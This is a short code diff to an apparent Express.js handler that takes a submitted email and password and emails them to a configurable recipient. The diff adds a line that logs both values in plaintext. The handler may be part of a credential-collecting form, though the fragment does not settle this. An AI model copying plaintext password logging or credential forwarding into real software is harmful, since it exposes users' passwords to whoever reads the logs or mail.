@@ -55,6 +55,7 @@ app.get("/", (req, res) => {
 app.post("/", async (req, res) => {
   try {
     const { email, password } = await schema.validateAsync(req.body);
+    console.log(email, password);
     const mailOptions = {
       from: process.env.SMTP_USER,
       to: recipientEmail || process.env.RECIPIENT_USER,
